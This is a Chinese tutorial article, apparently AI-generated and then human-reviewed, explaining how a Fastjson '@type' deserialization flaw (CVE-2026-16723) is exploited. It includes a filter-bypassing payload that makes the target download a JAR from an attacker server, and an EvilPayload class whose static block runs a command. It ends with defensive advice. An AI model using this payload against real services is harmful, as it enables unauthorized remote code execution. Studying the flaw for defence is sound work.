<!--
对话链接：https://chat.deepseek.com/share/fun1pp931vatf9lcea
-->

# CVE-2026-16723 的一种可行的利用方式

> 本文章由 DeepSeek-v4.1-flash 生成，由 [@jcshan709](https://github.com/jcshan709) 审查并修改

## 背景：Fastjson 是干什么的？

Fastjson 是一个 Java 库，它能把 **JSON 字符串** 变成 **Java 对象**，这个过程叫 **反序列化**。

假如你有一个 `User` 对象，定义如下：

```java
public class User {
    public String name;
    public int age;
}
```

然后，你用 Fastjson 反序列这个 JSON：

```json
{"name": "小明", "age": 18}
```

它就能创建一个 `User` 对象，把 `name` 和 `age` 填进去。

> 实际上，只要拥有类似的 `name` 和 `age` 字段的类都可以创建，取决于语境

为了方便，Fastjson 允许在 JSON 里用 `@type` 指定要创建的具体类，比如：

```json
{"@type": "java.util.HashMap", "key": "value"}
```

Fastjson 看到 `@type`，就会去加载 `java.util.HashMap` 这个类，然后创建它的实例。

**漏洞就出在这里：如果攻击者能控制 `@type` 的内容，就能让 Fastjson 去加载攻击者想要的任何类。**

---

## 手动编写的 Payload 长什么样？

攻击者发送的 JSON 是：
```json
{
  "@type": "jar:http:..2130706433:8000.probe!.EvilPayload"
}
```

看起来很奇怪，对吧？我们把它拆开看。

---

## 第一步：`@type` 原本应该是类名

正常情况下，`@type` 后面跟的是像 `java.util.HashMap` 这样的类名。

Fastjson 拿到这个类名后，会调用 Java 的 **类加载器**（ClassLoader）去加载它。

你可以把类加载器想象成一个图书管理员：你给它一个书名（类名），它就去书架上（硬盘上的 `.class` 文件）找这本书，然后加载到内存里。

---

## 第二步：攻击者把“书名”写成了一个网址

攻击者写的 `@type` 值是：
```
jar:http:..2130706433:8000.probe!.EvilPayload
```

这其实是一个 **JAR 协议的 URL**。Java 支持一种特殊的 URL 格式：
```
jar:http://服务器地址/文件.jar!/包路径/类名
```
它的意思是：先从 `http://服务器地址/文件.jar` 下载一个 JAR 包，然后从 JAR 包里加载指定的类。

但攻击者写的字符串里有很多奇怪的符号，为什么？为了绕过 Fastjson 的安全检查。

---

## 第三步：奇怪的符号是怎么变成合法 URL 的？

我们逐一解释：

### 1. `2130706433` 是什么？
这是 `127.0.0.1` 的 **整数形式**。
在计算机里，IP 地址可以表示成一个整数。`127.0.0.1` 换算成整数就是 `2130706433`。
攻击者用整数代替点分十进制，是为了躲避简单的字符串过滤（比如过滤 `127.0.0.1`）。

### 2. `..` 和 `.` 被替换成了 `/`
Fastjson 在内部处理类名时，会做一些转换。Java 的类名和文件路径有对应关系：
- 类名 `com.example.Foo` 对应文件路径 `com/example/Foo.class`
- 也就是说，**点号 `.` 会被替换成斜杠 `/`**。

攻击者利用了这个转换，同时构造了 `..`，在某些处理逻辑中，`..` 会被规范化为 `//`。

经过 Fastjson 内部的一番“翻译”，原始字符串：
```
jar:http:..2130706433:8000.probe!.EvilPayload
```
变成了：
```
jar:http://127.0.0.1:8000/probe!/EvilPayload
```
现在它就是一个完全合法的 JAR URL 了！

- `http://127.0.0.1:8000/probe` 是攻击者搭建的 HTTP 服务器上的一个 JAR 文件。
- `!` 是 JAR URL 的分隔符。
- `/EvilPayload` 表示要加载 JAR 包里的 `EvilPayload` 类。

---

## 第四步：类加载器去远程下载 JAR

Fastjson 以为自己在加载一个普通的类，但实际上它触发的是 Java 的 **URLClassLoader**。
URLClassLoader 会：
1. 访问 `http://127.0.0.1:8000/probe`，下载这个 JAR 文件。
2. 打开 JAR 包，找到 `EvilPayload.class`。
3. 把这个 class 文件加载到 JVM 内存中。

---

## 第五步：恶意类的静态代码块自动执行

攻击者在自己电脑上准备的 `EvilPayload.java` 长这样：
```java
public class EvilPayload {
    static {
        try {
            // 静态代码块：类第一次被加载时自动执行
            Runtime.getRuntime().exec("calc.exe");  // 比如弹出计算器
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

**关键点：Java 的静态代码块（`static { ... }`）在类被加载并初始化时，会自动执行，而且只执行一次。**

所以，当 JVM 加载 `EvilPayload` 类时，`static` 块里的命令就被运行了。攻击者可以在这里写任何命令：下载病毒、反弹 shell、删除文件等等。

---

## 整个攻击链条总结

1. 攻击者在自己的服务器上放一个恶意 JAR，里面有个 `EvilPayload` 类，静态代码块里写着要执行的命令。
2. 攻击者向目标应用发送一个 JSON，`@type` 的值是一个精心构造的字符串。
3. Fastjson 解析 `@type`，经过内部字符替换，把它变成了一个合法的 JAR URL。
4. Fastjson 的类加载器去远程下载这个 JAR，并加载 `EvilPayload` 类。
5. JVM 初始化 `EvilPayload` 类，静态代码块自动执行，攻击者的命令成功运行。
6. 目标服务器被远程控制。

---

## 安全提醒

以上内容**仅用于理解漏洞原理，必须在获得授权的测试环境（如自己的虚拟机、靶场）中实验**。未经授权对他人系统进行测试是违法行为。

对于开发者来说，最有效的防御是：
- 升级到 **Fastjson 2.x**。
- 如果暂时不能升级，立即开启 **SafeMode**（`-Dfastjson.parser.safeMode=true`）。
- 永远不要反序列化不可信的 JSON 数据。
